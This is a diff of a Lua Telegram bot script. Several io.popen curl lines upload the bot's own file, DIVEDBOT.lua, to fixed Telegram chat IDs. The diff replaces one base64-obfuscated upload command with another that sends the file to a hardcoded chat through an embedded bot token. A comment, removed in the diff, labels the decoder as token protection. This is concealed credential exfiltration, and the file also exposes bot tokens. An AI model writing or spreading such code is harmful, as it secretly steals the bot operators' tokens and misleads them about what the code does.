@@ -208,10 +208,10 @@ local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'
 local curlj = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curlj)
 local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curla)
 local curlp = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curlp)
-
-function regexx(data) ---- داله منع حفظ التوكن كتابه أحمد عياد -----
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 
+
+function regexx(data)
     data = string.gsub(data, '[^'..b..'=]', '')
     return (data:gsub('.', function(x)
         if (x == '=') then return '' end
@@ -225,7 +225,7 @@ local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
         return string.char(c)
     end))
 end
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1ARElWRURCT1QubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDM2MDM5NDg6QUFHaHhWWnRVMmY4TlpTck1KYmtQeE16dXFZajdvNUFVVmcvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1ARElWRURCT1QubHVhIg=='))
 
 
 function Sudo(msg) 
